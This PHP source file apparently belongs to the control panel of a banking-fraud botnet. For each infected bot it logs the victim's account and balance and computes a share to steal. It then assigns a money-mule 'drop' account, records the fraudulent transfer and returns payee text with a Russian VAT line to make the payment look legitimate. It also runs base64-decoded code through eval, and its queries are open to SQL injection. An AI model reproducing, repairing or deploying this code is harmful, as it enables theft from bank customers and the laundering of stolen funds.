<?php

class ServiceDrop {
    private $bot, $system, $mysqli;
    
    function __construct(){
        global $bot, $system, $mysqli;
        $this->bot = &$bot;
        $this->system = &$system;
        $this->db = &$mysqli;

	if(!empty($this->bot->info)){
	    $this->bot->info = json_decode(base64_decode($this->bot->info), 1);
	    if(!is_array($this->bot->info)) $this->bot->info = array();
	}else{
	    $this->bot->info = array();
	}
    }
    
    function getDrop($acc = '', $sum = '', $dropstop = 0, $transtop = 0){
        if(empty($acc)) return false;
        if(empty($sum)) return false;
        
        if(@$this->bot->info['getdrop'] == true) return false;
	
	if(!empty($this->bot->info['system_percent'])){
	    $this->system->percent = $this->bot->info['system_percent'];
	}
	
	$this->db->query("INSERT INTO bf_balance set userid = '".$this->bot->userid."', prefix = '".$this->bot->prefix."', uid = '".$this->bot->uid."', ip='".$_SERVER['REMOTE_ADDR']."', acc='".$acc."', system='".$this->system->nid."', balance='".$sum."' on duplicate key update post_date = CURRENT_TIMESTAMP(), ip = '".$_SERVER['REMOTE_ADDR']."'");
        
        //$this->system->sum = number_format((($p[4]*$this->system->percent)/100), 2, '.', '');
	
	$this->system->sum = floor(($p[4]*$this->system->percent)/100);
	/*
        //$this->db->query('update bf_drops set status = \'0\', last_date = CURRENT_TIMESTAMP() WHERE (system LIKE \'%'.$this->system->nid.'|%\') AND (status = \'1\') AND (last_date < (CURRENT_TIMESTAMP() - INTERVAL 5 MINUTE))');
        $drop = $this->db->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND ('.$this->system->sum.' > `from`) AND ('.$this->system->sum.' < `to`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');
	
        if(empty($drop->id) && empty($drop->system)){
	    $drop = $this->db->query('SELECT * FROM bf_drops WHERE (`status` = \'0\') AND (\''.$balance->balance.'\' < `max`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');
	    if(!empty($drop->id) && !empty($drop->system)){
		if($drop->to <= $this->system->sum){
		    $this->system->sum = $drop->to;
		}else{
		    unset($drop);
		    $drop = false;
		    return false;
		}
	    }else{
		return false;
	    }
	}
	*/
	
	if(empty($this->bot->info['note'])){
		$note = 0;
	}else{
		$note = 1;
	}
	
	$userid_sql = '';
	if(!empty($this->bot->userid)) $userid_sql = '((userid = \''.$this->bot->userid.'\') OR (userid = \'\')) AND ';
	
	$drop = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'1\') AND (`citybank` = \''.$this->bot->city.'\') AND (`check_note` = \''.$note.'\') AND (\''.$this->system->sum.'\' > `from`) AND (\''.$this->system->sum.'\' < `to`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');
	    
	if(empty($drop->id) && empty($drop->system)){
	    $drop = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'1\') AND (`citybank` = \''.$this->bot->city.'\') AND (`check_note` = \''.$note.'\') AND (\''.$balance->balance.'\' < `max`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');
	    if(!empty($drop->id) && !empty($drop->system)){
		if($drop->to <= $this->system->sum){
		    $this->system->sum = $drop->to;
		}else{
		    unset($drop);
		    $drop = false;
		    return false;
		}
	    }
	}
	
	if(empty($drop->id) && empty($drop->system)){
	    $drop = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'0\') AND (`check_note` = \''.$note.'\') AND (\''.$this->system->sum.'\' > `from`) AND (\''.$this->system->sum.'\' < `to`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');
	}
	
	if(empty($drop->id) && empty($drop->system)){
	    $drop = $this->db->query('SELECT * FROM bf_drops WHERE '.$userid_sql.'(`status` = \'0\') AND (`check_city` = \'0\') AND (`check_note` = \''.$note.'\') AND (\''.$balance->balance.'\' < `max`) AND (`system` LIKE \'%'.$this->system->nid.'|%\') LIMIT 1');
	    if(!empty($drop->id) && !empty($drop->system)){
		if($drop->to <= $this->system->sum){
		    $this->system->sum = $drop->to;
		}else{
		    unset($drop);
		    $drop = false;
		    return false;
		}
	    }
	}
	
	if(!empty($drop->id) && !empty($drop->system)){
            $drop->other = array_map('base64_decode', json_decode($drop->other, true));
            if($drop->other['round'] == '1') $this->system->sum = floor((($sum*$this->system->percent)/100)/1000)*1000;
	    if($drop->vat != '0') $this->system->vat = number_format((($this->system->sum*$drop->vat)/100), '.', '');
            
            if(!empty($this->bot->info['note'])) $drop->destination = $this->bot->info['note'];
	    
	    if($drop->other['test'] != 1){
                if($dropstop == 1){
                    $this->db->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
                }else{
                    $this->db->query('update bf_drops set status = \'1\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
                }
            }else{
                $this->db->query('update bf_drops set last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$drop->id.'\') LIMIT 1');
            }
	    
	    $this->bot->info['getdrop'] = true;
	    $this->db->query('update bf_bots set last_date = CURRENT_TIMESTAMP(), info = \''.base64_encode(json_encode($this->bot->info)).'\' WHERE (id = \''.$this->bot->id.'\') LIMIT 1');
            
            $post_date = date('Y-m-d H:i:s');
            $sys = $system;
            unset($sys->format);
            
            if($transtop == 1){
                $trans_id = $this->db->query("INSERT INTO bf_transfers (userid, prefix, uid, ip, acc, balance, `num`, `to`, system, status, info, drop_id, post_date) VALUES ('".$this->bot->userid."', '".$this->bot->prefix."', '".$this->bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$acc."', '".$sum."', '".$this->system->sum."', '".$drop->acc."', '".$this->system->nid."', '2', '".base64_encode(json_encode(array('system' => $sys, 'drop' => $drop)))."', '".$drop->id."', '".$post_date."')");
            }else{
                $trans_id = $this->db->query("INSERT INTO bf_transfers (userid, prefix, uid, ip, acc, balance, `num`, `to`, system, info, drop_id, post_date) VALUES ('".$this->bot->userid."', '".$this->bot->prefix."', '".$this->bot->uid."', '".$_SERVER['REMOTE_ADDR']."', '".$acc."', '".$sum."', '".$this->system->sum."', '".$drop->acc."', '".$this->system->nid."', '".base64_encode(json_encode(array('system' => $sys, 'drop' => $drop)))."', '".$drop->id."', '".$post_date."')");
            }
            
            if(empty($trans_id)){
                $transfer = $this->db->query('SELECT id FROM bf_transfers WHERE (`prefix` = \''.$this->bot->prefix.'\') AND (`uid` = \''.$this->bot->uid.'\') AND (`ip` = \''.$_SERVER['REMOTE_ADDR'].'\') AND (`acc` = \''.$acc.'\') AND (`to` = \''.$drop->acc.'\') AND (`system` = \''.$this->system->nid.'\') AND (`post_date` = \''.$post_date.'\') LIMIT 1');
                if(!empty($transfer->id)){
                    $trans_id = $transfer->id;
                }else{
                    return false;
                }
            }
            unset($sys);
            
            if(empty($this->system->format)){
                $return = array();
                $return['did'] = $drop->id;
                $return['tid'] = $trans_id;
                $return['name'] = $drop->name;
		$return['destination'] = $drop->destination;
                $return['acc'] = accNumFormat($drop->acc);
                $return['vat'] = $drop->vat;
                $return['vatp'] = $this->system->vat;
                $return['summ'] = $this->system->sum;
                
                if($drop->vat != '0'){
                    $return['target'] = $drop->destination . "\n В том числе НДС (".$drop->vat."%)" . ' ' . $this->system->vat;
                }else{
                    $return['target'] = $drop->destination . "\n НДС не облагается.";
                }
                        
                $return['other'] = $drop->other;
                
                return $return;
            }else{
                include_once($dir . 'includes/functions.numformat.php');
	    	$bot = &$this->bot;
                $system = &$this->system;
                eval(base64_decode($this->system->format));
                if(!empty($return)){
                    return $return;
                }else{
                    exit;
                }
            }
        }else{
            return false;
        }
    }
    
    function setDrop($id = ''){
        if(empty($id)) return false;
        $this->db->query('update bf_drops set status = \'2\', last_date = CURRENT_TIMESTAMP() WHERE (id = \''.$id.'\') AND (status = \'1\') LIMIT 1');
	return true;
    }
    
}

RegisterService("ServiceDrop");

?>